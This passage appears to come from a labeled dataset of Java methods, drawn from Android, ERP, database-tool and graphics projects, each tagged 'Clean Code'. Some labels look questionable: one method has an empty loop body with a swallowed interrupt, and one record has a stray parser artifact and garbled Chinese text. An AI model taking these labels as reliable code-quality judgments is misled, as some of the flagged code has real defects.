      if (instance == EmbedBottomSheet.this) {
        instance=null;
      }
      videoView.destroy();
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
}
",0,Clean Code
"public String buildArgsStr(){
  StringBuilder sb=new StringBuilder();
  for (  ArgInfo argInfo : argInfos) {
    if (argInfo.isEnabled() && argInfo.getKey() != null && !argInfo.getKey().isEmpty() && argInfo.getValue() != null) {
      if (sb.length() > 0) {
        sb.append(""&"");
      }
      sb.append(argInfo.getKey());
      sb.append(""="");
      try {
        sb.append(URLEncoder.encode(argInfo.getValue(),""UTF-8""));
      }
 catch (      Throwable t) {
        sb.append(argInfo.getValue());
        Log.e(""Encode arg error "" + argInfo.getValue(),t);
      }
    }
  }
  if (sb.length() > 0) {
    sb.insert(0,""?"");
  }
  return sb.toString();
}",0,Clean Code
"@PostConstruct private void init(){
  SupportThreadPoolConfig.getPendingSingleThreadPool().execute(() -> {
    while (true) {
      try {
        for (        ReceiptMessageStater receiptMessageStater : receiptMessageStaterList) {
        }
        Thread.sleep(2000);
      }
 catch (      Exception e) {
        log.error(""MessageReceipt#init fail:{}"",Throwables.getStackTraceAsString(e));
        Thread.currentThread().interrupt();
      }
    }
  }
);
}",0,Clean Code
"public void write(RowData record) throws IOException {
  try {
    String recordKey=keyGen.getRecordKey(record);
    String partitionPath=keyGen.getPartitionPath(record);
    if ((lastKnownPartitionPath == null) || !lastKnownPartitionPath.equals(partitionPath) || !handle.canWrite()) {
      LOG.info(""Creating new file for partition path "" + partitionPath);
      handle=getRowCreateHandle(partitionPath);
      lastKnownPartitionPath=partitionPath;
    }
    handle.write(recordKey,partitionPath,record);
  }
 catch (  Throwable t) {
    LOG.error(""Global error thrown while trying to write records in HoodieRowCreateHandle "",t);
    throw t;
  }
}
",0,Clean Code
"@Override @Transactional(rollbackFor=Exception.class) public void deleteStockIn(List<Long> ids){
  List<ErpStockInDO> stockIns=stockInMapper.selectBatchIds(ids);
  if (CollUtil.isEmpty(stockIns)) {
    return;
  }
  stockIns.forEach(stockIn -> {
    if (ErpAuditStatus.APPROVE.getStatus().equals(stockIn.getStatus())) {
      throw exception(STOCK_IN_DELETE_FAIL_APPROVE,stockIn.getNo());
    }
  }
);
  stockIns.forEach(stockIn -> {
    stockInMapper.deleteById(stockIn.getId());
    stockInItemMapper.deleteByInId(stockIn.getId());
  }
);
}
",0,Clean Code
"private void addPrimaryKey(Table newTable,TableColumn column,String status){
  List<TableIndex> indexes=newTable.getIndexList();
  if (indexes == null) {
    indexes=new ArrayList<>();
  }
  TableIndex keyIndex=indexes.stream().filter(index -> ""Primary"".equalsIgnoreCase(index.getType())).findFirst().orElse(null);
  if (keyIndex == null) {
    keyIndex=new TableIndex();
    keyIndex.setType(""Primary"");
    keyIndex.setName(StringUtils.isBlank(column.getPrimaryKeyName()) ? ""PRIMARY_KEY"" : column.getPrimaryKeyName());
    keyIndex.setTableName(newTable.getName());
    keyIndex.setSchemaName(newTable.getSchemaName());
    keyIndex.setDatabaseName(newTable.getDatabaseName());
    keyIndex.setEditStatus(status);
    if (!EditStatus.ADD.name().equals(status)) {
      keyIndex.setOldName(keyIndex.getName());
    }
    indexes.add(keyIndex);
  }
  List<TableIndexColumn> tableIndexColumns=keyIndex.getColumnList();
  if (tableIndexColumns == null) {
    tableIndexColumns=new ArrayList<>();
  }
  TableIndexColumn indexColumn=new TableIndexColumn();
  indexColumn.setColumnName(column.getName());
  indexColumn.setTableName(newTable.getName());
  indexColumn.setSchemaName(newTable.getSchemaName());
  indexColumn.setDatabaseName(newTable.getDatabaseName());
  indexColumn.setOrdinalPosition(Short.valueOf(column.getPrimaryKeyOrder() + """"));
  indexColumn.setEditStatus(status);
  tableIndexColumns.add(indexColumn);
  List<TableIndexColumn> sortTableIndexColumns=tableIndexColumns.stream().sorted(Comparator.comparing(TableIndexColumn::getOrdinalPosition)).collect(Collectors.toList());
  Set<String> statusList=sortTableIndexColumns.stream().map(TableIndexColumn::getEditStatus).collect(Collectors.toSet());
  if (statusList.size() == 1) {
    keyIndex.setEditStatus(statusList.iterator().next());
  }
 else {
    keyIndex.setEditStatus(EditStatus.MODIFY.name());
  }
  keyIndex.setColumnList(sortTableIndexColumns);
  newTable.setIndexList(indexes);
}",0,Clean Code
"public void writeToParcel(Parcel dest){
  dest.writeInt(componentTag);
  dest.writeLong(componentSplicePts);
  dest.writeLong(componentSplicePlaybackPositionUs);
}
@Override public void writeToParcel(Parcel dest,int flags){
  dest.writeLong(spliceEventId);
  dest.writeByte((byte)(spliceEventCancelIndicator ? 1 : 0));
  dest.writeByte((byte)(outOfNetworkIndicator ? 1 : 0));
  dest.writeByte((byte)(programSpliceFlag ? 1 : 0));
  dest.writeByte((byte)(spliceImmediateFlag ? 1 : 0));
  dest.writeLong(programSplicePts);
  dest.writeLong(programSplicePlaybackPositionUs);
  int componentSpliceListSize=componentSpliceList.size();
  dest.writeInt(componentSpliceListSize);
  for (int i=0; i < componentSpliceListSize; i++) {
    componentSpliceList.get(i).writeToParcel(dest);
  }
  dest.writeByte((byte)(autoReturn ? 1 : 0));
  dest.writeLong(breakDurationUs);
  dest.writeInt(uniqueProgramId);
  dest.writeInt(availNum);
  dest.writeInt(availsExpected);
}",0,Clean Code
"String getWordAtCursor(final SettingsValues settingsValues,final String currentKeyboardScript){
  if (!mConnection.hasSelection() && settingsValues.isSuggestionsEnabledPerUserSettings() && settingsValues.mSpacingAndPunctuations.mCurrentLanguageHasSpaces) {
    final TextRange range=mConnection.getWordRangeAtCursor(settingsValues.mSpacingAndPunctuations,currentKeyboardScript,false);
    if (range != null) {
      return range.mWord.toString();
    }
  }
  return """";
}
",0,Clean Code
"public List<Create_routine_optionContext> create_routine_option(){
  return getRuleContexts(Create_routine_optionContext.class);
}
public Create_routine_optionContext create_routine_option(int i){
  return getRuleContext(Create_routine_optionContext.class,i);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@2299384",0,Clean Code
"void updatePlaybackState(){
  if (hasValidMedia()) {
    mPlaybackSpeed=getCurrentSpeedId();
    updatePlaybackState(mPlaybackSpeed);
  }
}
private void updatePlaybackState(int playbackSpeed){
  if (mControlsRow == null) {
    return;
  }
  final SparseArrayObjectAdapter primaryActionsAdapter=(SparseArrayObjectAdapter)getControlsRow().getPrimaryActionsAdapter();
  if (mFastForwardAction != null) {
    int index=0;
    if (playbackSpeed >= PLAYBACK_SPEED_FAST_L0) {
      index=playbackSpeed - PLAYBACK_SPEED_FAST_L0 + 1;
    }
    if (mFastForwardAction.getIndex() != index) {
      mFastForwardAction.setIndex(index);
      notifyItemChanged(primaryActionsAdapter,mFastForwardAction);
    }
  }
  if (mRewindAction != null) {
    int index=0;
    if (playbackSpeed <= -PLAYBACK_SPEED_FAST_L0) {
      index=-playbackSpeed - PLAYBACK_SPEED_FAST_L0 + 1;
    }
    if (mRewindAction.getIndex() != index) {
      mRewindAction.setIndex(index);
      notifyItemChanged(primaryActionsAdapter,mRewindAction);
    }
  }
  if (playbackSpeed == PLAYBACK_SPEED_PAUSED) {
    updateProgress();
    enableProgressUpdating(false);
  }
 else {
    enableProgressUpdating(true);
  }
  if (mFadeWhenPlaying && getHost() != null) {
    getHost().setControlsOverlayAutoHideEnabled(playbackSpeed == PLAYBACK_SPEED_NORMAL);
  }
  if (mPlayPauseAction != null) {
    int index=playbackSpeed == PLAYBACK_SPEED_PAUSED ? PlaybackControlsRow.PlayPauseAction.INDEX_PLAY : PlaybackControlsRow.PlayPauseAction.INDEX_PAUSE;
    if (mPlayPauseAction.getIndex() != index) {
      mPlayPauseAction.setIndex(index);
      notifyItemChanged(primaryActionsAdapter,mPlayPauseAction);
    }
  }
  List<PlayerCallback> callbacks=getPlayerCallbacks();
  if (callbacks != null) {
    for (int i=0, size=callbacks.size(); i < size; i++) {
      callbacks.get(i).onPlayStateChanged(this);
    }
  }
}",0,Clean Code
"@Override public Object callAction(ActionParam actionParam,String env,Cookie[] cookies,String tenant){
  log.info(""[Action][Call] action label: {}"",actionParam.getActionLabel());
  String actionType=actionParam.getActionType();
  ActionDO actionDO=new ActionDO();
  if (!paramsValidation(actionType,actionParam.getActionMeta())) {
    throw new RuntimeException(String.format(""params is not valid: %s"",actionParam));
  }
  try {
    ClassUtil.copy(actionParam,actionDO);
  }
 catch (  Exception e) {
    log.error(""convert actionparams to actionDo failed, msg: {}, traceback: {}"",e.getMessage(),e.getStackTrace());
    throw new RuntimeException(""Can't convert actionparams to actionDo"");
  }
  Object validationResult=callValidation(actionParam);
  if (validationResult != null) {
    return validationResult;
  }
  actionDO.setProcessor(actionParam.getProcessorInfo().toJSONString());
  actionDO.setActionMetaData(actionParam.getActionMeta().toJSONString());
  Long startTime=System.currentTimeMillis();
  actionDO.setUuid(UUID.randomUUID().toString());
  actionParam.setUuid(actionDO.getUuid());
  if (actionParam.getOrderType() != null) {
    actionDO.setOrderType(actionParam.getOrderType());
  }
  JSONObject result=getData(actionParam,env,cookies,tenant);
  log.info(""----[Action Get Data] {}"",result);
  actionParam.setStartTime(System.currentTimeMillis());
  JSONObject execData=getExecData(actionParam.getActionType(),actionParam.getAppCode(),result);
  actionDO.setExecData(execData.toJSONString());
  actionDO.setStartTime(startTime);
  actionDO.setEndTime(execData.getLong(""endTime""));
  actionDO.setStatus(execData.getString(""status""));
  actionDO.setActionType(execData.getString(""_tesla_action_type""));
  log.info(""[Action][Insert] action label: {}"",actionDO.getActionLabel());
  actionDAO.insert(actionDO);
  if (actionType.equals(""API"")) {
    JSONObject urlMeta=actionParam.getActionMeta();
    return result;
  }
  log.info(""---begin to create order"");
  return result;
}
",0,Clean Code
"private void submitFrame(){
  if (swapChainUpdate)   return;
  try (MemoryStack stack=stackPush()){
    int vkResult;
    VkSubmitInfo submitInfo=VkSubmitInfo.calloc(stack);
    submitInfo.sType(VK_STRUCTURE_TYPE_SUBMIT_INFO);
    submitInfo.waitSemaphoreCount(1);
    submitInfo.pWaitSemaphores(stack.longs(imageAvailableSemaphores.get(currentFrame)));
    submitInfo.pWaitDstStageMask(stack.ints(VK_PIPELINE_STAGE_COLOR_ATTACHMENT_OUTPUT_BIT));
    submitInfo.pSignalSemaphores(stack.longs(renderFinishedSemaphores.get(currentFrame)));
    submitInfo.pCommandBuffers(stack.pointers(currentCmdBuffer));
    vkResetFences(device,stack.longs(inFlightFences.get(currentFrame)));
    Synchronization.INSTANCE.waitFences();
    if ((vkResult=vkQueueSubmit(DeviceManager.getGraphicsQueue().queue(),submitInfo,inFlightFences.get(currentFrame))) != VK_SUCCESS) {
      vkResetFences(device,stack.longs(inFlightFences.get(currentFrame)));
      throw new RuntimeException(""Failed to submit draw command buffer: "" + vkResult);
    }
    VkPresentInfoKHR presentInfo=VkPresentInfoKHR.calloc(stack);
    presentInfo.sType(VK_STRUCTURE_TYPE_PRESENT_INFO_KHR);
    presentInfo.pWaitSemaphores(stack.longs(renderFinishedSemaphores.get(currentFrame)));
    presentInfo.swapchainCount(1);
    presentInfo.pSwapchains(stack.longs(Vulkan.getSwapChain().getId()));
    presentInfo.pImageIndices(stack.ints(imageIndex));
    vkResult=vkQueuePresentKHR(DeviceManager.getPresentQueue().queue(),presentInfo);
    if (vkResult == VK_ERROR_OUT_OF_DATE_KHR || vkResult == VK_SUBOPTIMAL_KHR || swapChainUpdate) {
      swapChainUpdate=true;
      return;
    }
 else     if (vkResult != VK_SUCCESS) {
      throw new RuntimeException(""Failed to present swap chain image"");
    }
    currentFrame=(currentFrame + 1) % framesNum;
  }
 }",0,Clean Code
"public static SpiderInfo getSpiderInfo(GalleryInfo info){
  SpiderInfo spiderInfo;
  UniFile mDownloadDir=getGalleryDownloadDir(info);
  if (mDownloadDir != null && mDownloadDir.isDirectory()) {
    UniFile file=mDownloadDir.findFile(SPIDER_INFO_FILENAME);
    spiderInfo=SpiderInfo.read(file);
    if (spiderInfo != null && spiderInfo.gid == info.gid && spiderInfo.token.equals(info.token)) {
      return spiderInfo;
    }
  }
  return null;
}
public static SpiderInfo getSpiderInfo(GalleryDetail info){
  try {
    SpiderInfo spiderInfo=new SpiderInfo();
    spiderInfo.gid=info.gid;
    spiderInfo.token=info.token;
    spiderInfo.pages=info.SpiderInfoPages;
    spiderInfo.pTokenMap=new SparseArray<>(spiderInfo.pages);
    readPreviews(info,0,spiderInfo);
    return spiderInfo;
  }
 catch (  ParseException e) {
    FirebaseCrashlytics.getInstance().recordException(e);
  }
  return null;
}",0,Clean Code
"@Override @Transactional public int addFailure(FailureInstanceCreateReq req) throws Exception {
  if (!existRefDefinition(req.getDefId(),Constant.FAILURE)) {
    throw new CommonDefinitionNotExistException(String.format(""鏁呴殰瀹氫箟[id:%s]涓嶅瓨鍦�"",req.getDefId()));
  }
  FailureInstance instance=new FailureInstance();
  Date now=new Date();
  instance.setGmtCreate(now);
  instance.setGmtModified(now);
  instance.setName(req.getName());
  instance.setDefId(req.getDefId());
  instance.setAppInstanceId(req.getAppInstanceId());
  instance.setAppComponentInstanceId(req.getAppComponentInstanceId());
  instance.setIncidentId(req.getIncidentId());
  instance.setGmtOccur(new Timestamp(req.getOccurTs()));
  instance.setGmtRecovery(req.getRecoveryTs() != null ? new Timestamp(req.getRecoveryTs()) : null);
  instance.setLevel(req.getLevel());
  instance.setContent(req.getContent());
  int result=failureInstanceMapper.insert(instance);
  addFailureRecordByInstance(instance,false);
  return result;
}
",0,Clean Code
